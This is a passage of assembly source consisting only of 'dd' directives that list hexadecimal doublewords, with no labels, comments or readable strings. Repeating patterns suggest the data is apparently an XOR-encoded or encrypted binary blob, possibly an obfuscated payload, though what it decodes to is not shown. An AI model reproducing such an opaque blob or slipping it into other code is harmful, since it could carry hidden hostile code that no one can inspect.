		dd 83C06A3Ah, 0CB818BE0h, 83ADBC20h, 1DD1ED3Bh,	98FD7D4h
		dd 48CB898Bh, 0C524BB76h, 0EFFD0157h, 890F2E00h, 0FE3CCBB9h
		dd 0CB798B3Fh, 0EFFD90h, 0C524BB74h, 9AFCF86Ch,	54157C0Eh
		dd 0F200EFFEh, 0EFFDEE6Ch, 83FE1600h, 0F175ED05h, 0EDADFA6Eh
		dd 83E0FD00h, 0FD00EF26h, 5B76D664h, 0EF6124h, 0D95466FDh
		dd 67FB8BDBh, 0E646D0Ch, 0E924AB77h, 0EE6C4467h, 4C64FB8Bh
		dd 352BF3D9h, 89FFF92Eh, 27FB189h, 2FEC314h, 0CBA98B10h
		dd 2A2C7718h, 3BEED43Fh, 0AFED24ABh, 11CBB988h,	0D974669Bh
		dd 0D49C74FDh, 8BC689D6h, 7640CBB1h, 0CCC924ABh, 7427C6CDh
		dd 0D99464E6h, 0EFFD0073h, 14CBA18Bh, 0E5249B74h, 0FED95C67h
		dd 0D664FF8Bh, 0E124AB74h, 0F3D97C64h, 0CA64388Bh, 0B18B072Eh
		dd 0E37410CBh, 0FFA47087h, 0FD00EE45h, 6A1DD3EFh, 0D1E989C5h
		dd 88C56A15h, 9B3B3B15h, 0FFA7700Bh, 350322DEh,	7088E964h
		dd 38CBA98Bh, 61246B76h, 0B0FD00EFh, 95E3705Eh,	0FD00EFFDh
		dd 3EFE1064h, 8BFF745Dh, 0FD94CB69h, 0AB7600EFh, 89B4F524h
		dd 7EC0DCFFh, 0B03E7C2Bh, 157A05Eh, 0A600EFFDh,	2C81C46Ch
		dd 907F6D90h, 6D907F6Dh, 7F6D907Fh, 4CBB18Bh, 0D95C64AEh
		dd 64AA56FFh, 10003CF9h, 2FF0E7Ch, 147E00EFh, 8BDC8801h
		dd 0CE14CBA9h, 0ECFF8A2Fh, 0F1167CC8h, 8F00EF02h, 1E1481E9h
		dd 3EFFDFFh, 0CFF6E04h,	9DFD0010h, 0F1007C06h, 7600EF02h
		dd 0F3C5F28h, 0C1E4A310h, 898B2CA6h, 197814CBh,	5EB0F475h
		dd 0FD00EE45h, 6C3E5BEFh, 3A9CEDFBh, 784B2C76h,	62F2742Fh
		dd 0D2DCFC43h, 3703F977h, 0A70403A9h, 0F96E0975h, 0FD00100Ch
		dd 67C069Dh, 0EF02F1h, 2F332876h, 0EF02F151h, 0F618A200h
		dd 3F8BB4A3h, 0E4EDE02Eh, 0FB6E3EC1h, 0FD00FA4Dh, 397F0FBAh
		dd 0B8EFFD00h, 0A36E4652h, 53CE318h, 24BB740Bh,	4DEB6EE5h
		dd 52FD00FAh, 0EFFC5Bh,	2F332FCEh, 0B9770665h, 3327FE01h
		dd 0FF46653Dh, 25FEF9ECh, 56652F33h, 0FEF9ECFEh, 653D3327h
		dd 0F9ECF946h, 2F3325FEh, 0ECF85665h, 3327FEF9h, 0FB46653Dh
		dd 25FEF9ECh, 56652F33h, 0FEF9ECFAh, 653D3327h,	0F9ECF546h
		dd 2F3325FEh, 0ECF45665h, 3327FEF9h, 0F746653Dh, 25FEF9ECh
		dd 56652F33h, 0FEF9ECF6h, 653D3327h, 0F9ECF146h, 2F3325FEh
		dd 0ECF05665h, 3327FEF9h, 0F346653Dh, 25FEF9ECh, 56652F33h
		dd 0FEF9ECF2h, 0FF3B8327h, 0CAEC0403h, 0F24D16FEh, 1002676Ah
		dd 332E76FFh, 2F1562Fh,	1E0A00EFh, 0F1503A8Bh, 7600EF02h
		dd 182F3325h, 24A302F7h, 0F2FA64E5h, 1002386Ah,	0F3478FFh
		dd 0FD003579h, 0FF0683EFh, 4E7F0Fh, 168BEFFDh, 0DCF9ED2Eh
		dd 8A2FCED2h, 0FC4665EBh, 3DCECAECh, 3EDAB8Ah, 0CEC8EC04h
		dd 0ECBB8A2Fh, 0CAEC0403h, 0AB8A3DCEh, 0EC0403EBh, 8A2FCEC8h
		dd 403EABBh, 3DCECAECh,	3E9AB8Ah, 0CEC8EC04h, 0E8BB8A2Fh
		dd 0CAEC0403h, 0AB8A3DCEh, 0EC0403E7h, 8A2FCEC8h, 403E6BBh
		dd 3DCECAECh, 3E5AB8Ah,	0CEC8EC04h, 0E4BB8A2Fh,	0CAEC0403h
		dd 0AB8A3DCEh, 0EC0403E3h, 8A2FCEC8h, 403E2BBh,	3DCECAECh
		dd 3E1AB8Ah, 0CEC8EC04h, 0E0BB8A2Fh, 0CAEC0403h, 0FE10047Eh
		dd 0EC350316h, 10297EF9h, 9985E0B0h, 6402FF10h,	0D26AB6D3h
		dd 0BE8DE089h, 652F33EEh, 4625FE16h, 884816FEh,	0DC3C8B1Bh
		dd 0FF1E44D2h, 0CBEEFFDh, 18FD0010h, 8B2876F1h,	0AD2DC37h
		dd 64078B19h, 0E02EA0C7h, 0F65EB0EDh, 7F3E5B2Eh, 8CBB98Bh
		dd 0FC752F78h, 0CBB18B2Ch, 24BB760Ch, 0AF50BEF9h, 0EFFD0707h
		dd 0C2B7E00h, 6D907F3Eh, 0EBD94464h, 8CBB18Bh, 0AA56BAAEh
		dd 0F3D97C64h, 0D0180285h, 3CF6CC89h, 64E374ECh, 8A34CED0h
		dd 2E26EE4h, 0DCFD00EFh, 8073CD3h, 9595FB76h, 0DCED019Fh
		dd 75A0BCC2h, 0DDFF6C20h, 6DF2F164h, 0EFFF21h, 10C10076h
		dd 0DCEB8BEAh, 332DCEC9h, 74D4652Fh, 65E524ABh,	83F5D94Ch
		dd 0E18BEB3Bh, 0EE85687Ah, 8B3F7610h, 896862F1h, 10D810EEh
		dd 0C1EFFD00h, 3633F717h, 64F9C66Ch, 7087681Ch,	0AB8BFFFCh
		dd 64363313h, 7C87781Ch, 3633FFFCh, 25CEC0DCh, 0D5652F33h
		dd 0E524A374h, 0F5D94465h, 8BEB3B83h, 85687AE1h, 3E7610EEh
		dd 686AF98Bh, 7C10EE89h, 0EFFDFF0Eh, 18053C00h,	3B832CCEh
		dd 7AE18BEBh, 10EE8D68h, 0CEF8B976h, 62E18B2Ch,	10EE8168h
		dd 34332CCEh, 3DCEC2DCh, 4466298Ah, 0B18AF7D9h,	297E1ACBh
		dd 95F37604h, 0ED019795h, 0E376D064h, 19B958Dh,	0FDFFCAEDh
		dd 53C00EFh, 8B24CE18h,	8D687AE1h, 0B97610EEh, 8B24CEF8h
		dd 81686AE1h, 24CE10EEh, 0CADC3D33h, 288A3DCEh,	0F7D94C66h
		dd 1ACBB98Ah, 9595F376h, 64ED0197h, 85EB76D1h, 0ED019B95h
		dd 0EF02E16Eh, 0EA2EFD00h, 76C3DCE5h, 9F9595F3h, 5664ED01h
		dd 76C3DC01h, 93958DF3h, 0C3DCED01h, 3F3326CEh,	0AB74D2DCh
		dd 0D465E524h, 0E724A377h, 87700C64h, 8BFFFC74h, 85687AE1h
		dd 3F7610EEh, 33F717C1h, 0FDFFCA36h, 0F37600EFh, 19F9595h
		dd 0CE1664EDh, 6AE18B24h, 10EE8168h, 3D3324CEh,	3DCECADCh
		dd 4C66288Ah, 0B98AF7D9h, 297E1ACBh, 95F37604h,	0ED019795h
		dd 0EB76D164h, 19B9585h, 2E16EEDh, 2EFD00EFh, 0C3DCE5EAh
		dd 7604297Eh, 9F9595F3h, 5664ED01h, 76C3DC01h, 93958DF3h
		dd 0C3DCED01h, 3F3326CEh, 3B77D2DCh, 18CBB989h,	0E724A377h
		dd 64F9C66Ch, 7887681Ch, 2D8BFFFCh, 87700C64h, 25FFFC74h
		dd 0FD00EF02h, 0DCE5EA2Eh, 20007ECBh, 9595F376h, 64ED019Fh
		dd 0CBDC0156h, 9585F376h, 0DCED0193h, 332FCECBh, 77D2DC37h
		dd 0CBB1893Ah, 24AB7718h, 681C64E7h, 0FFFC7887h, 4642C8Bh
		dd 0FC748778h, 101C81FFh, 0C1EFFD00h, 3E33F717h, 87681C64h
		dd 33FFFC70h, 701C643Eh, 0FFFC7C87h, 0FA23E33h,	2FD0B78h
		dd 0EB028310h, 0EF64B372h, 7602023Ch, 0DC3433F9h, 8A3DCEC2h
		dd 0D9446629h, 0CBB18AF7h, 4297E1Ah, 9595F376h,	64ED0197h
		dd 8DE376D0h, 0ED019B95h, 0EFFDFFCAh, 18053C00h, 128324CEh
		dd 7AE18BEBh, 10EE8D68h, 0E18B24CEh, 0EE81686Ah, 4D24CE10h
		dd 4A752E76h, 0F189FF6Ah, 0D2DC358Bh, 1C81F977h, 0EFFD0010h
		dd 0E82E3733h, 700C64F5h, 0FFFC7087h, 4FA93C33h, 0A35F0D88h
		dd 3F0A5BB2h, 907F6DC3h, 6D907F6Dh, 7F6D907Fh, 907F6D90h
		dd 0FD008415h, 0CBB98BEFh, 8862AD04h, 0FD00EF69h, 0E6759062h
		dd 8866FD00h, 0FD00E4E5h, 0E5818862h, 8866FD00h, 0FD00E4CDh
		dd 6F3AC9DCh, 0EFF620h,	0ED010DCDh, 0E4D99066h,	8028FD00h
		dd 0FD00E4D1h, 0FFFCE2A7h, 0BD77DC7h, 1F60EFFDh, 669B10EEh
		dd 0F94588h, 418866FDh,	28FD00F9h, 0F94980h, 0FD00E7FDh
		dd 0EFEBE8EFh, 0C3B6FD00h, 6D907F6Dh, 7F6D902Ch, 907F6D90h
		dd 6D907F6Dh, 7F6D907Fh, 4CBA98Bh, 0FC1E56ABh, 19CE00EFh
		dd 7B7F8Dh, 7466EFFDh, 0EB3D83DFh, 8D188849h, 0FD09677Fh
		dd 0EFE3B9EFh, 8989FD00h, 0F9C06CCDh, 620A75A6h, 0E58182h
		dd 0FD1356FDh, 669B00EFh, 42F7E30h, 74F79AB4h, 0EFEBAC5Dh
		dd 0A85D7400h, 7400EFEBh
		dd 0EFEBB05Dh, 0A05D7400h, 9B00EFEBh, 0EB698228h, 0EEFD00h
		dd 6D902CA3h, 7F6D907Fh, 907F6D90h, 0F924AB76h,	0F9418864h
		dd 0F96CFD00h, 766291F0h, 0BCED24BBh, 0D31D7656h, 0F548641Bh
		dd 5FF466B8h, 0EFEBB8h,	77149F76h, 0EFEBB877h, 31F37500h
		dd 76149F76h, 26CE0897h, 1656758Ah, 7446EFFDh, 0E375149Fh
		dd 14A77637h, 0EBBC5F76h, 66BC00EFh, 0B989E948h, 0D666EFEDh
		dd 3C9B5F21h, 0F3297EEAh, 0EBBC5F74h, 0B4A300EFh, 0B87F7466h
		dd 1600EFEBh, 0CBA98BF9h, 660D2E10h, 0EBB87FF4h, 2E7E00EFh
		dd 0BC677403h, 7600EFEBh, 64F124A3h, 6AE7D954h,	0AD52BEFCh
		dd 0EFE47707h, 102B7E00h, 6D907F3Eh, 9B7656BCh,	0B8B8F124h
		dd 0FD00EFFFh, 0F9418E64h, 0F96CFD00h, 765D91F0h, 0F2E14B9h
		dd 66E7B38Bh, 0EBB869F4h, 697700EFh, 0EFEBB8h, 7611EB75h
		dd 0B97614A1h, 4E66BC08h, 0CEC164E9h, 56738A26h, 88EFFD16h
		dd 0BB8BEDF1h, 569B40FBh, 4666FD10h, 418664E9h,	89FD00F9h
		dd 255352Bh, 9B00EFFDh,	2F7EEA3Ch, 0BC6974F3h, 9B00EFEBh
		dd 0F9459666h, 1204FD00h, 0F4660F2Eh, 0EFEBB869h, 32E7E00h
		dd 0EBBC6174h, 617600EFh, 0EFEBBCh, 76663DCEh, 0EE68B6FAh
		dd 0FF4510h, 3F2BEFFDh,	5B5CC8D4h, 7EFFFC95h, 2FFCAA3h
		dd 177600EFh, 4E641AD3h, 430989F5h, 0EFFD1657h,	8AFB838Bh
		dd 0FD165763h, 0D6E188EFh, 8BFB838Bh, 3433E7A3h, 0F9448E65h
		dd 89A8FD00h, 0F188FB83h, 0FBB38BD4h, 1653438Bh, 7441EFFDh
		dd 569B14A1h, 2B89FD10h, 0EA546232h, 72E661Fh, 16536B89h
		dd 7466EFFDh, 0EFEBB869h, 0D3FE1600h, 7B09891Dh, 0EFFD1657h
		dd 8E663703h, 0FD00F941h, 0F8BBE8B9h, 8E64FD00h, 0FD00F941h
		dd 0F9499664h, 0D1C4FD00h, 7E042B7Eh, 157E0B2Dh, 1062F209h
		dd 7E00EFFCh, 0ED450D16h, 7EEFFD00h, 0E95664A0h, 0A176E03Ch
		dd 86E69B08h, 0FD00F945h, 0F9458665h, 467FD00h,	0E94E64ECh
		dd 0AEF55664h, 8BFBB389h, 77C9DC3Ch, 0EFEBB961h, 2E37500h
		dd 0BD14A976h, 0EFEDB989h, 8BFBBB89h, 0FD16537Bh, 27D666EFh
		dd 0EFFFBAh, 17D389FDh,	660EC06Ch, 0F94186h, 6B8989FDh
		dd 0EFFD1657h, 0E03CEFEBh, 4586E69Bh, 6CFD00F9h, 8E66FEC1h
		dd 0FD00F941h, 0F9418E64h, 0D2DCFD00h, 4B15649Bh, 57ED017Ah
		dd 0EFFD10h, 353B2DD6h,	0EE68B44Eh, 25B18310h, 0FD001002h
		dd 82EF864h, 66E7B38Bh,	0EBB851F4h, 917600EFh, 0B8717714h
		dd 7500EFEBh, 917639F3h, 8B17614h, 738A26CEh, 0EFFD1656h
		dd 14917447h, 763BE375h, 517614A1h, 0EFEBBCh, 0E94E66BCh
		dd 0EFEDB989h, 8D20D666h, 9BF0F8A9h, 7974E83Ch,	0EFEBBCh
		dd 4586669Bh, 4FD00F9h,	660F2E11h, 0EBB869F4h, 25FE00EFh
		dd 16537389h, 1556EFFDh, 0EFFD16F3h, 0C7EB3983h, 0FD165B7Bh
		dd 0EFFD07EFh, 5BB1A200h, 6D907F3Eh, 7F6D907Fh,	907F6D90h
		dd 918BBAAEh, 64AB14CBh, 33FFD974h, 738BB83Dh, 0EFFD006Bh
		dd 57913485h, 8583E976h, 0E18802C3h, 15A51556h,	0F38BEFFDh
		dd 66F9C46Ch, 9662D141h, 0FD00E4E5h, 3A1556BDh,	8DEFFD01h
		dd 0FD0BCB7Bh, 7AB50EFh, 0EFFCC8h, 0FA9207ABh, 797600EFh
		dd 0EFEBA8h, 0EBAC6176h, 2D7E00EFh, 0A2E7E0Ah, 3C03053Ch
		dd 2B7E0306h, 7725C614h, 700304FAh, 3E7605A2h, 3BEB808Dh
		dd 761D9807h, 6AE524B3h, 8BFA89DBh, 0AA20CB81h,	7AB53BAh
		dd 0FF100170h, 14102B7Eh, 0EFFD01B7h, 674383h, 0F204EFFDh
		dd 0EFFDBA6Bh, 0F25C600h, 0FD005D79h, 53738BEFh, 8BEFFD16h
		dd 7E20CB81h, 0B8700D16h, 8BB58304h, 0E96E6427h, 0E69BE33Ch
		dd 0F9459Eh, 0F55E64FDh, 0F9458E65h, 0C67FD00h,	0E95E64D6h
		dd 0ACF56E64h, 8BFBA389h, 77DBDC36h, 0EFEBB971h, 29F37500h
		dd 7614A176h, 0EFEBBC71h, 4E66BC00h, 0EDB989E9h, 24D666EFh
		dd 83052E66h, 63891C3Eh, 0EFFD1653h, 0B8797466h, 1600EFEBh
		dd 891FD3FDh, 16576B09h, 3C83EFFDh, 537389ECh, 8BEFFD16h
		dd 0FD0BF373h, 64AD40EFh, 0E4D586h, 0AD41AFFDh,	121556BEh
		dd 8DEFFD07h, 0FD09676Bh, 7B7B8DEFh, 52EFFD00h,	24E8B9ADh
		dd 6CFD00E0h, 9106E1C4h, 7600EFFDh, 0EFEBBC61h,	24937600h
		dd 0F0F96CDDh, 91FF4762h, 0D33F765Ah, 0E94E641Fh, 576B0989h
		dd 8BEFFD16h, 638AE7ABh, 0EFFD1657h, 8BFEE188h,	0A38BFBABh
		dd 0B97442E7h, 33257614h, 4496652Fh, 67FD00F9h,	4E64E414h
		dd 419664E9h, 0AEFD00F9h, 66FBB389h, 9B00FF44h,	3C9BCAC4h
		dd 0F32D7EE8h, 0EBBC7974h, 669B00EFh, 0F94586h,	2E1204FDh
		dd 69F4660Fh, 0EFEBB8h,	74032E7Eh, 0EFEBBC61h, 96DB9500h
		dd 4968FFFCh, 0B9ED017Eh, 0E0BEE8h, 0F1C46CFDh,	1567E8B9h
		dd 0C46C02FFh, 89FF6AF9h, 621556E6h, 83EFFD14h,	0A35FEB39h
		dd 7F3E5BB2h, 907F6D90h, 7608037Eh, 0BCED24ABh,	7464AB55h
		dd 7657F7D9h, 0E7BD8BD7h, 8B103083h, 0F14864E5h, 0A374C0DCh
		dd 0C8D4E924h, 0ED248374h, 0FBAD8666h, 8628FD00h, 0FD00FBA9h
		dd 0EFFD02D2h, 0D764C37Eh, 0FD3A6C9Bh, 6176249Bh, 0EFE950h
		dd 0ED24AB74h, 66158BAEh, 0FBAD8Eh, 738466FDh, 0EFFD0BB3h
		dd 58DF79C6h, 0FD00EFE9h, 289B0604h, 0EFFF42h, 0E924A376h
		dd 0EB3F83AFh, 0C4933C3Bh, 0E9506176h, 167E00EFh, 83B28002h
		dd 0F87DED00h, 4388BAAh, 412FCE02h, 0E9506174h,	6B7400EFh
		dd 0E4A18Eh, 0F9C789FDh, 29FD0168h, 14B7FB84h, 7600EFFDh
		dd 0EFEBA879h, 0DB6AB700h, 0EBA87974h, 0FA8900EFh, 8B893433h
		dd 76026CB1h, 0EFEBAC69h, 892ED600h, 0FD16437Bh, 0BF738BEFh
		dd 83EFFD14h, 5A7CED04h, 0FFD96C66h, 20CBA98Bh,	76048574h
		dd 0EFE95069h, 0C2C46400h, 6D13776h, 93FCFB6Ch,	56B8AE11h
		dd 0FD01D015h, 0E33983EFh, 1147E4Bh, 0B98B0080h, 0AB7414CBh
		dd 462E924h, 0D944667Ah, 0BF7B8BF3h, 8BEFFD14h,	0FD0B8F63h
		dd 0B8FC6AEFh, 5C69718Bh, 0B500EFF6h, 8F7389B9h, 89EFFD0Bh
		dd 0FD14BF7Bh, 0EF03E8EFh, 9664FD00h, 0FD00FBA9h, 0E49DAE64h
		dd 0C46CFD00h, 3F8BA5F1h, 0FBA99666h, 9C66FD00h, 0FD0BB37Bh
		dd 0BB738BEFh, 49EFFD14h, 73892E76h, 0EFFD14BBh, 5C695189h
		dd 9B00EFF6h, 89521464h, 8B70E903h, 9B1CCBB9h, 6B771066h
		dd 0FBA51Eh, 0D38C65FDh, 0EFFD14B7h, 79D3C3Ah, 0FD0010D8h
		dd 6EF5EBEFh, 0EF02E1h,	76C164FDh, 11E924A3h, 57EE97C0h
		dd 0A50E6B75h, 64FD00FBh, 66CBD944h, 0FFAFA374h, 70B18989h
		dd 60617402h, 0BC00EFF6h, 0B9F9C06Ch, 20CBB189h, 0D524AB74h
		dd 0EFFD6307h, 50697600h, 7E00EFE9h, 177E0C2Bh,	2A62F202h
		dd 76FF1002h, 0EFE95479h, 60617600h, 0B700EFF6h, 0FBA99666h
		dd 0C264FD00h, 0DD24BB76h, 637456BDh, 0E4A186h,	0FC0A07FDh
		dd 0AB7600EFh, 0C66EE524h, 0FD00E4C1h, 7AA50B9h, 0EFFE28h
		dd 0A2142B7Eh, 6CA65DB1h, 902CF5C4h, 6D907F6Dh,	7F6D907Fh
		dd 907F6D90h, 0F924AB76h, 64AB55BCh, 8BF7D974h,	0FD14BF6Dh
		dd 437657EFh, 0E4A1B0h,	0CB0C62FDh, 8374CAD4h, 8FE0E924h
		dd 0FD00EF60h, 0F7D97C64h, 0B464C97Dh, 0FD0B8F75h, 67518BEFh
		dd 0EFF65Ch, 4A14649Bh,	40E18B89h, 723CC666h, 77139AE9h
		dd 0FBA5067Bh, 9C65FD00h, 0FD14B7D5h, 982E3AEFh, 6C64BC01h
		dd 498BFBD9h, 0EFF65C67h, 14649B00h, 0E18B8952h, 3CC66658h
		dd 129AD272h, 0A5287B77h, 65FD00FBh, 14B7FB9Ch,	2E3AEFFDh
		dd 0BB762B99h, 4C66E124h
		dd 1CD1F3D9h, 0B36DB466h, 8BEFFD0Bh, 0FD14BF6Dh, 91373BEFh
		dd 24A37687h, 745EB0E1h, 0E4A18843h, 5BB2FD00h,	0D954643Eh
		dd 66A35FF3h, 0BB36DACh, 0A65DEFFDh, 5F51892Ch,	0EFF65Ch
		dd 0A65DB1A2h, 7F6D902Ch, 907F6D90h, 6D907F6Dh,	7F6D907Fh
		dd 8BF31183h, 0AE24CBB9h, 0F77656BAh, 8BEBB58Bh, 0B189E7BDh
		dd 0DCAA18CBh, 8BFF76F6h, 958BEBB5h, 0CBA989FFh, 8BF7614h
		dd 0D924A374h, 0CFD95466h, 30CBA98Bh, 0FD00E744h, 623D33EFh
		dd 0E4C1BAh, 0D97466FDh, 6456F3FFh, 0FBA982h, 0D96C66FDh
		dd 6D718BC7h, 0EFF65Ch,	7674669Bh, 0BB4F8BEDh, 46EFFD14h
		dd 0FF3D117Ch, 62F200EFh, 0EFFCA9h, 0A1B26B70h,	66FD00E4h
		dd 0B8DFD944h, 0FD00EDC0h, 1FFEC6C4h, 18CBB989h, 0C9249B74h
		dd 0DFD94C64h, 0FFDC3D33h, 7666E676h, 89FF8BABh, 26C818Bh
		dd 0C6402876h, 64F67E2Ah, 8BFFD97Ch, 8189A838h,	937610CBh
		dd 8989E124h, 0C60264B9h, 649D7F20h, 66CFD974h,	0C1426B02h
		dd 0DCFD00E4h, 7C21C6FFh, 0D6F964F6h, 0CB898B11h, 0BED37624h
		dd 7634649Bh, 97CC7ECh,	0EF02FFh, 0FCC640F2h, 0EFEBA86Dh
		dd 24AB7600h, 89C06AE9h, 0CB918BCDh, 662FCE14h,	0FF8DAB76h
		dd 0F9518A64h, 0C7ECFD00h, 0D5248376h, 0EC3BAFE0h, 0AC6574C8h
		dd 7600EFEBh, 64C9249Bh, 8BDFD94Ch, 7E18CBB9h, 66B5042Eh
		dd 89DFD94Ch, 0F218CBB9h, 1002536Ah, 249376FFh,	0F2FF6AEDh
		dd 0EFFDD46Bh, 0FFAA7000h, 0BFBC6C9Bh, 0EFFD0BD3h, 42637000h
		dd 0FD00E4C1h, 67E0A9Ah, 8389B502h, 0B74EFC4h, 0AD71FF89h
		dd 0EFF63Ch, 0BF846C9Bh, 0EFFD0BD1h, 8C109B02h,	0FD0BD397h
		dd 0ED1283EFh, 0C1900285h, 8B0278h, 0EF7684E0h,	0AC62FD00h
		dd 0FD0BD397h, 0CB9189EFh, 662FCE18h, 7800AA76h, 0CBB9892Fh
		dd 8D8D8930h, 0F65C5D51h, 9B7600EFh, 4D64C924h,	1083A101h
		dd 0CB8989EBh, 249B7634h, 74CED4E1h, 90D52483h,	8B9B7038h
		dd 9BC0DCFFh, 28C60664h, 0EF64DF74h, 3D3307D6h,	64F98B89h
		dd 8B07520Fh, 0FD16477Fh, 643803EFh, 89C7D96Ch,	0FD16477Fh
		dd 0D17466EFh, 30CBB98Bh, 0D94466B5h, 9A3D85DFh, 249B76A9h
		dd 0D96C64C9h, 27E4FF7h, 89107802h, 8818CB91h, 0B2A35F6Fh
		dd 1C2B7E5Bh, 6D907F3Eh, 7F6D907Fh, 907F6D90h, 6D907F6Dh
		dd 0E3D95464h, 33CF1183h, 0D94C623Dh, 9B7056EDh, 0D6C4FB24h
		dd 0FD0F51AAh, 649B00EFh, 0C16CF73Ch, 50389FFh,	2876E73Eh
		dd 41669B4Eh, 76EB9A03h, 6ACD24ABh, 8BD981C0h, 702CCB89h
		dd 26CE0197h, 2A17666h,	0E2742678h, 0A3A98B89h,	0C264AC08h
		dd 0FDFF10D8h, 89AD42EFh, 10A3A989h, 0FD0EF015h, 0E73983EFh
		dd 83E97466h, 884FEB3Bh, 6CA35F3Eh, 902CDDC4h, 6D907F6Dh
		dd 7F6D907Fh, 907F6D90h, 0D97464ABh, 0F37B8BE7h, 8DEFFD0Bh
		dd 0FD007B73h, 0B9AC50EFh, 0EFAAE8h, 0D59664FDh, 62FD00E4h
		dd 0E67586h, 0AB50BDFDh, 0EFFD4307h, 30617000h,	0AC00EFF6h
		dd 160BE8B9h, 0C46C02FFh, 0FD1257DDh, 3DCE00EFh, 914F6D8Ah
		dd 7E66FFFCh, 0E5839653h, 75EFFD00h, 583A7FBh, 641A7DECh
		dd 0F95596h, 0BD4C62FDh, 662C03FEh, 0F95596h, 6DC3B1FDh
		dd 0CBB98BBEh, 0C9DCAE0Ch, 0B58B89ABh, 10CE57EDh, 0CCBB9C7h
		dd 2FF1002h, 0E847C96Ah, 0BEEFFD00h, 0FD00EFF9h, 65470A9Ah
		dd 0BEEFFD00h, 0FD00EFFEh, 0F3D95C64h, 0C7892685h, 20677B9h
		dd 70710F10h, 43EFFD00h, 0D95C66A8h, 0CBA18BF3h, 6877018h
		dd 34332E76h, 0EFB08B89h, 7D15C647h, 89C1D4F9h,	92033B81h
		dd 0BCEE9B0Ah, 0FD0A937Eh, 6ACDEBEFh, 3BF889C0h, 8910CBB9h
		dd 6B0266E7h, 0E58183h,	7EFF89FDh, 0EFFD0A53h, 0FF6CE8EBh
		dd 9B0990F7h, 0E53D8310h, 704FD00h, 3983109Bh, 0DCFD00E5h
		dd 24AB74FFh, 88C96AEDh, 0EF77BAE3h, 351FD00h, 1600EFFDh
		dd 9A3C3BF5h, 0E9470Ch,	0FEBEEFFDh, 4FD00EFh, 0E8470Ah
		dd 0F9BEEFFDh, 64FD00EFh, 83F3D944h, 7448EB38h,	0E0E124ABh
		dd 0FF109285h, 0A35FB202h, 7F3E59B4h, 907F6D90h, 6D907F6Dh
		dd 0AB7655BCh, 8BB9ED24h, 0AA10CB89h, 0F9418E64h, 0F96CFD00h
		dd 0F85D91F6h, 1002FE10h, 0E23C2D8Bh, 9B14A176h, 0F94596E6h
		dd 5664FD00h, 459E65F5h, 67FD00F9h, 4E64EC1Ch, 0F57E64E9h
		dd 7977D2DCh, 0EFEBB9h,	0E94E66BCh, 64C41467h, 0F94196h
		dd 0E96E64FDh, 0EFEDB989h, 4525D666h, 7EE83C9Bh, 8174F52Dh
		dd 0BC797414h, 9B00EFEBh, 0F9458666h, 1704FD00h, 2FE10F8h
		dd 891DD310h, 16577B09h, 3C83EFFDh, 537389EAh, 8BEFFD16h
		dd 0FD165373h, 0E40483EFh, 5464A27Eh, 0BF8DF3D9h, 3C2D8B10h
		dd 14A176E2h, 4596E69Bh, 64FD00F9h, 9E65F556h, 0FD00F945h
		dd 64EC1C67h, 7E64E94Eh, 77D2DCF5h, 0EFEBB979h,	4E66BC00h
		dd 0C41467E9h, 0F9419664h, 6E64FD00h, 0EDB989E9h, 25D666EFh
		dd 0E83C9B45h, 74F52D7Eh, 79741481h, 0EFEBBCh, 4586669Bh
		dd 4FD00F9h, 24AB7617h,	1DD3A7E1h, 577B0989h, 83EFFD16h
		dd 7389EA3Ch, 0EFFD1653h, 1653738Bh, 918BEFFDh,	167E20CBh
		dd 0FCAA700Ch, 2D8BB583h, 0A176E23Ch, 96E69B14h, 0FD00F945h
		dd 65F55664h, 0F9459Eh,	0EC1C67FDh, 64E95664h, 89ADF57Eh
		dd 378BFBABh, 7977D2DCh, 0EFEBB9h, 7639FB75h, 797614A1h
		dd 0EFEBBCh, 0E94E66BCh, 0EFEDB989h, 6625D666h,	3F83072Eh
		dd 536B891Bh, 66EFFD16h, 0EBB86974h, 0FD1600EFh, 9891DD3h
		dd 0FD16577Bh, 0EB3C83EFh, 16537389h, 233EFFDh,	61F2ED6Ah
		dd 0EFFDA3h, 0EBBC6176h, 167E00EFh, 3383830Dh, 77C0DC2Fh
		dd 0EE6CA078h, 84649B10h, 0FD0A916Bh, 3C2D8BEFh, 14A176E2h
		dd 4596E69Bh, 64FD00F9h, 9E65F556h, 0FD00F945h,	64EC1C67h
		dd 5E64E956h, 0AB89ADF5h, 0DC378BFBh, 0B97977D2h, 7500EFEBh
		dd 0A17619FBh, 0BC797614h, 0BC00EFEBh, 89E94E66h, 66EFEDB9h
		dd 2E6625D6h, 1C3F8307h, 16536B89h, 7466EFFDh, 0EFEBB869h
		dd 33CC1600h, 5D87653Dh, 89ED017Eh, 7E69698Bh, 9B00EFF7h
		dd 0E69BE23Ch, 0F94596h, 0FEC16CFDh, 0F9418E66h, 3BA8FD00h
		dd 0A08CE000h, 6402FF10h, 8DF7D944h, 0FD007B73h, 0BEAD48EFh
		dd 0C91556h, 0A98BEFFDh, 697028CBh, 0EFF488h, 0AB50BDB7h
		dd 0EFFD1307h, 182B7E00h, 0A65DB1A2h, 7F6D902Ch, 907F6D90h
		dd 6D907F6Dh, 64F5EC6Ch, 53FFD944h, 2F3334CEh, 0EDA58B89h
		dd 57347856h, 0F124AB3Ah, 1002FF10h, 0EFFAB9h, 0FD0451FDh
		dd 0E58800EFh, 0EF77B9h, 0FD0351FDh, 937600EFh,	0FF6ADD24h
		dd 0F83063F2h, 2F7E00EFh, 4466BA06h, 0B98BCFD9h, 66A818CBh
		dd 8BFBD97Ch, 7624CB81h, 0AD263304h, 3BF07666h,	0D95C662Ch
		dd 0CBA989F3h, 3BE78020h, 1984E016h, 0D4FD00EBh, 0AC62F2D6h
		dd 7600EFFDh, 0EFEBBC67h, 6619CE00h, 83A85B76h,	50FD00E5h
		dd 0EFFD10h, 323B11D6h,	3DCE6791h, 0A87B7666h, 0FD00E581h
		dd 82EFA64h, 66E7B58Bh,	0EBB857F4h, 977600EFh, 0B8777714h
		dd 7500EFEBh, 977639F3h, 8B77614h, 758A26CEh, 0EFFD1656h
		dd 14977447h, 761FE375h, 577614A7h, 0EFEBBCh, 0E94866BCh
		dd 0EFEDB989h, 6620D666h, 7466052Eh, 0EFEBB87Fh, 37BB7000h
		dd 4190660Dh, 64FD00F9h, 0EBCFD954h, 418B89E7h,	0EFF77C47h
		dd 0E73C9B00h, 45B8E69Bh, 0ECFD00F9h, 0BC6774CEh, 0B700EFEBh
		dd 0CFD95466h, 0FFB6780Fh, 1E91002h, 6AFD00ECh,	0C16BF2EDh
		dd 0C600EFFCh, 0E0ED2483h
		dd 0EF5C84h, 418864FDh,	0DCFD00F9h, 0B4649BF6h,	0FD0A9155h
